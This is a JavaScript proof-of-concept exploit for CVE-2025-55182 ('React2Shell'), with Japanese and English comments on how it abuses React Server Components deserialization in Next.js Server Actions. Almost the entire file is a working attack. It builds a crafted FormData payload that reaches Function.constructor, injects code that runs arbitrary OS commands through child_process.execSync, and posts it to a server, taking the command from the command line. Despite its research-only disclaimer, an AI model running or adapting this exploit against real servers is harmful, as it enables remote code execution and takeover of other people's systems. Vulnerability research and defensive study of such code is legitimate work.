// CVE-2025-55182 (React2Shell) Proof of Concept
// Based on: https://github.com/dwisiswant0/CVE-2025-55182
//
// ⚠️ 教育・研究目的のみ / For Educational and Research Purposes Only
//
// Exploit Essence (エクスプロイトの本質):
// 1. React Server Components (RSC) のデシリアライゼーション処理を悪用
// 2. FormDataペイロードで Server Action の `.constructor` プロパティにアクセス
// 3. Functionコンストラクタを利用して任意のJavaScriptコードを実行
// 4. child_processモジュールを使ってOSコマンドを実行
//
// Technical Details (技術的な詳細):
// - Server Action IDに `#constructor` を付加することで Function.constructor にアクセス
// - `bound` パラメータで実行するコードを注入
// - RSCのFlightプロトコルのパース処理中に eval 相当の処理が発生

async function pwn(cmd = 'id') {
  // Build the RCE code
  let susCode = `const cmd = ${JSON.stringify(cmd)};`
  susCode += `
  return import('child_process').then(cp => {
    const output = cp.execSync(cmd).toString();
    return output;
  }).catch(e => console.log('err:', e.message));`

  const formData = new FormData()

  // Approach: Fully mimic exploit-official-poc.js structure with circular references
  // This complex payload structure is designed to reach Function.constructor

  formData.append('0', '"$1"')  // Changed from $F1 to $1

  formData.append('1', JSON.stringify({
    status: 'resolved_model',
    reason: 0,
    _response: '$4',
    value: '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
    then: '$2:then',
  }))

  formData.append('2', '"$@3"')

  formData.append('3', JSON.stringify([]))

  formData.append('4', JSON.stringify({
    _prefix: susCode,
    _formData: { get: '$3:constructor:constructor' },
    _chunks: '$2:_response:_chunks',
  }))

  try {
    const response = await fetch('http://localhost:3000', {
      method: 'POST',
      headers: {
        'next-action': '1', // Required for Next.js Server Actions
      },
      body: formData,
    })

    const text = await response.text()
    console.log('Response:', text)
    process.exit(0)
  } catch (e) {
    console.error('Request failed:', e)
    process.exit(1)
  }
}

const args = process.argv.slice(2).join(' ')
pwn(args)
